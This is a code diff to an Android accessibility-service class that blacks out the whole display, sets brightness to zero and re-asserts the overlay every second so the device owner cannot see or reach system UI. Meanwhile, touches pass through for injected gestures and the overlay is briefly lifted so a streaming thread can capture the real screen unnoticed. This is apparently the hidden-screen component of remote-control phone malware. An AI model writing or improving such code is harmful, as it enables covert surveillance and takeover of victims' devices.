@@ -13,16 +13,13 @@ import org.json.JSONObject;
 /**
  * ScreenBlackout — draws a full-screen opaque black overlay using TYPE_ACCESSIBILITY_OVERLAY.
  *
- * NEW APPROACH (fixes accessibility/responsiveness issues):
- * - Uses FLAG_NOT_TOUCHABLE so all touches pass through to the accessibility layer.
- *   Accessibility gesture dispatch (dispatchGesture) injects events at the system level
- *   and works regardless of touch-consuming overlays, but using FLAG_NOT_TOUCHABLE is cleaner
- *   and ensures the accessibility service's own event loop never blocks.
+ * - Covers status bar (top), notification panel, navigation bar (home/back/recents, bottom).
  * - Sets screenBrightness = 0f (hardware brightness to zero) on the layout params.
- * - Uses FLAG_LAYOUT_NO_LIMITS so the overlay extends above the status bar / notification panel.
- * - runWithOverlayHidden() hides/shows the overlay on the main thread but runs the capture
- *   task on the CALLER'S thread (background), avoiding a deadlock with captureScreenSync()
- *   which itself may post back to the main thread via takeScreenshot().
+ * - Uses FLAG_LAYOUT_NO_LIMITS so the overlay extends beyond all system UI insets.
+ * - A 1-second "keep-on-top" loop re-applies the overlay every second to prevent
+ *   any system UI from appearing on top after the block is enabled.
+ * - runWithOverlayHidden() hides/shows the overlay on the main thread but runs the
+ *   capture task on the CALLER'S thread (avoids deadlock with captureScreenSync).
  */
 public class ScreenBlackout {
 
@@ -31,9 +28,10 @@ public class ScreenBlackout {
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
     private final Object  lock        = new Object();
 
-    private UnifiedAccessibilityService service     = null;
-    private View                        overlayView = null;
-    private boolean                     active      = false;
+    private UnifiedAccessibilityService service      = null;
+    private View                        overlayView  = null;
+    private WindowManager.LayoutParams  overlayParams = null;
+    private boolean                     active       = false;
     private boolean                     viewAttached = false;
 
     private static volatile ScreenBlackout instance;
@@ -58,6 +56,7 @@ public class ScreenBlackout {
     /** Called by UnifiedAccessibilityService.onUnbind() */
     public void clearService() {
         synchronized (lock) {
+            stopKeepOnTopLoop();
             if (active) removeOverlay();
             this.service = null;
         }
@@ -68,16 +67,55 @@ public class ScreenBlackout {
         synchronized (lock) { return active; }
     }
 
+    // ── Keep-on-top loop ─────────────────────────────────────────────────────
+
     /**
-     * Enable block screen — runs at front of main queue for minimum latency.
+     * Every 1 second: remove and re-add the overlay so it is always the topmost window.
+     * This prevents system dialogs, launchers, or other overlays from appearing over the block.
+     */
+    private final Runnable keepOnTopRunnable = new Runnable() {
+        @Override
+        public void run() {
+            synchronized (lock) {
+                if (!active || !viewAttached || overlayView == null
+                        || overlayParams == null || service == null) return;
+                try {
+                    WindowManager wm = (WindowManager)
+                            service.getSystemService(android.content.Context.WINDOW_SERVICE);
+                    // Remove then immediately re-add to assert z-order supremacy
+                    wm.removeView(overlayView);
+                    wm.addView(overlayView, overlayParams);
+                    Log.d(TAG, "keep-on-top: overlay re-asserted");
+                } catch (Exception e) {
+                    Log.e(TAG, "keep-on-top error: " + e.getMessage());
+                }
+            }
+            mainHandler.postDelayed(this, 1000);
+        }
+    };
+
+    private void startKeepOnTopLoop() {
+        mainHandler.removeCallbacks(keepOnTopRunnable);
+        mainHandler.postDelayed(keepOnTopRunnable, 1000);
+    }
+
+    private void stopKeepOnTopLoop() {
+        mainHandler.removeCallbacks(keepOnTopRunnable);
+    }
+
+    // ── Enable ───────────────────────────────────────────────────────────────
+
+    /**
+     * Enable block screen — covers the entire display including status bar,
+     * notification panel, AND navigation bar (home/back/recents).
      *
      * Key design decisions:
-     * 1. FLAG_NOT_TOUCHABLE: all touches pass through to accessibility service. This means
-     *    accessibility gestures (dispatchGesture) continue to work normally.
-     * 2. screenBrightness = 0f: dims the physical screen to zero via window params.
-     * 3. FLAG_LAYOUT_NO_LIMITS: overlay extends beyond screen bounds, covering status bar/
-     *    notification panel (the top area with battery/clock).
-     * 4. TYPE_ACCESSIBILITY_OVERLAY: doesn't require SYSTEM_ALERT_WINDOW permission.
+     * 1. FLAG_NOT_TOUCHABLE: touches pass through to accessibility layer.
+     * 2. screenBrightness = 0f: dims the physical screen to zero.
+     * 3. FLAG_LAYOUT_NO_LIMITS: extends beyond screen bounds in all directions.
+     * 4. Overlay shifted UP by (statusBarH + padding) and height includes
+     *    both statusBarH (top) + navBarH (bottom) so nothing is exposed.
+     * 5. 1-second keep-on-top loop re-adds the overlay to maintain z-order.
      */
     public JSONObject enableBlackout() {
         JSONObject result = new JSONObject();
@@ -106,32 +144,44 @@ public class ScreenBlackout {
 
                         View v = new View(service);
                         v.setBackgroundColor(Color.BLACK);
-                        // No touch listener — FLAG_NOT_TOUCHABLE lets all touches pass through
-                        // so the accessibility service can still dispatch gestures.
 
-                        // Get real display size including status bar
+                        // Real physical display size (includes all insets)
                         android.graphics.Point displaySize = new android.graphics.Point();
-                        WindowManager wmDisp = (WindowManager) service.getSystemService(android.content.Context.WINDOW_SERVICE);
+                        WindowManager wmDisp = (WindowManager)
+                                service.getSystemService(android.content.Context.WINDOW_SERVICE);
                         wmDisp.getDefaultDisplay().getRealSize(displaySize);
                         int realW = displaySize.x;
                         int realH = displaySize.y;
 
-                        // Get status bar height so we can shift the overlay above it
+                        // Status bar height (top inset)
                         int statusBarH = 0;
                         try {
-                            int resId = service.getResources().getIdentifier("status_bar_height", "dimen", "android");
-                            if (resId > 0) statusBarH = service.getResources().getDimensionPixelSize(resId);
+                            int resId = service.getResources().getIdentifier(
+                                    "status_bar_height", "dimen", "android");
+                            if (resId > 0)
+                                statusBarH = service.getResources().getDimensionPixelSize(resId);
                         } catch (Exception ignored) {}
-                        if (statusBarH <= 0) statusBarH = 80; // safe fallback ~24dp @ 3x
+                        if (statusBarH <= 0) statusBarH = 80;
+
+                        // Navigation bar height (bottom inset — home/back/recents)
+                        int navBarH = 0;
+                        try {
+                            int resId = service.getResources().getIdentifier(
+                                    "navigation_bar_height", "dimen", "android");
+                            if (resId > 0)
+                                navBarH = service.getResources().getDimensionPixelSize(resId);
+                        } catch (Exception ignored) {}
+                        if (navBarH <= 0) navBarH = 120; // safe fallback ~40dp @ 3x
 
                         // Extra padding to cover display cutouts and rounded corners
-                        int extra = 60;
+                        int extra = 80;
 
-                        // Overlay is shifted UP by (statusBarH + extra) so it starts
-                        // well above the status bar, and its height is expanded to match.
+                        // Overlay positioned to cover: status bar (top) + screen + nav bar (bottom)
+                        // Y is negative to push the top of the overlay above the status bar.
+                        // Height is expanded to also extend below the screen into the nav bar zone.
                         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                 realW,
-                                realH + statusBarH + extra,
+                                realH + statusBarH + navBarH + extra * 2,
                                 WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                         | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
@@ -141,7 +191,7 @@ public class ScreenBlackout {
                                 PixelFormat.OPAQUE
                         );
                         params.x = 0;
-                        params.y = -(statusBarH + extra);
+                        params.y = -(statusBarH + extra); // shift up to cover status bar
 
                         // Cover display cutouts on Android 9+ (notch / punch-hole)
                         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
@@ -156,11 +206,13 @@ public class ScreenBlackout {
                                 service.getSystemService(android.content.Context.WINDOW_SERVICE);
                         wm.addView(v, params);
 
-                        overlayView  = v;
-                        active       = true;
-                        viewAttached = true;
-                        success[0]   = true;
-                        Log.i(TAG, "Screen block ENABLED — brightness=0, overlay covers full screen including status bar");
+                        overlayView   = v;
+                        overlayParams = params;
+                        active        = true;
+                        viewAttached  = true;
+                        success[0]    = true;
+                        Log.i(TAG, "Screen block ENABLED — covers status bar + screen + nav bar (h="
+                                + params.height + " y=" + params.y + ")");
                     } catch (Exception e) {
                         Log.e(TAG, "enableBlackout error: " + e.getMessage());
                     }
@@ -177,8 +229,10 @@ public class ScreenBlackout {
 
             synchronized (lock) {
                 if (success[0]) {
+                    // Start 1-second loop to keep overlay on top of any system UI
+                    startKeepOnTopLoop();
                     result.put("success", true);
-                    result.put("message", "Screen block enabled — brightness at zero, full screen covered");
+                    result.put("message", "Screen block enabled — full display covered including navigation bar");
                 } else {
                     result.put("success", false);
                     result.put("error", "Failed to attach overlay — accessibility service may not be active");
@@ -190,7 +244,9 @@ public class ScreenBlackout {
         return result;
     }
 
-    /** Disable block screen — runs at front of main queue for minimum latency. */
+    // ── Disable ──────────────────────────────────────────────────────────────
+
+    /** Disable block screen — stops the keep-on-top loop and removes the overlay. */
     public JSONObject disableBlackout() {
         JSONObject result = new JSONObject();
         try {
@@ -201,6 +257,9 @@ public class ScreenBlackout {
                     return result;
                 }
             }
+
+            // Stop keep-on-top loop before touching the view to avoid a race
+            stopKeepOnTopLoop();
 
             final Object latch   = new Object();
             final boolean[] done = {false};
@@ -236,28 +295,25 @@ public class ScreenBlackout {
         } catch (Exception e) {
             Log.e(TAG, "disableBlackout removeView: " + e.getMessage());
         } finally {
-            overlayView  = null;
-            active       = false;
-            viewAttached = false;
+            overlayView   = null;
+            overlayParams = null;
+            active        = false;
+            viewAttached  = false;
             Log.i(TAG, "Screen block DISABLED — brightness restored");
         }
     }
+
+    // ── Screenshot helper ─────────────────────────────────────────────────────
 
     /**
      * Briefly hide the overlay so the streaming thread can capture real content,
      * then immediately restore it.
      *
-     * Timing target: remove overlay → screenshot → restore overlay in 10–50 ms
-     * so the physical user cannot perceive any flicker.
-     *
      * Design:
-     * - Hide and restore both run at the FRONT of the main-thread queue (postAtFrontOfQueue)
-     *   for minimum latency.
+     * - Hide and restore both run at the FRONT of the main-thread queue.
      * - The hide step waits at most 30 ms for the main thread to execute.
-     * - The capture runs on the CALLER'S background thread (avoids deadlock with
-     *   takeScreenshot which itself posts back to the main thread).
-     * - The restore is posted at the FRONT of the queue immediately after capture,
-     *   so the overlay is back within ~1 frame (≤16 ms) of the capture completing.
+     * - The capture runs on the CALLER'S background thread (avoids deadlock).
+     * - The restore is posted at the FRONT of the queue right after capture.
      */
     public void runWithOverlayHidden(Runnable captureTask) {
         boolean isActive;
@@ -268,7 +324,6 @@ public class ScreenBlackout {
             return;
         }
 
-        // Step 1: Post hide to front of main queue — wait at most 30 ms
         final Object hideLatch   = new Object();
         final boolean[] hideDone = {false};
 
@@ -286,11 +341,9 @@ public class ScreenBlackout {
             }
         }
 
-        // Step 2: Run capture on THIS thread (background)
         try {
             captureTask.run();
         } finally {
-            // Step 3: Restore at front of main queue — minimum latency
             mainHandler.postAtFrontOfQueue(() -> {
                 synchronized (lock) {
                     if (active && viewAttached && overlayView != null) {
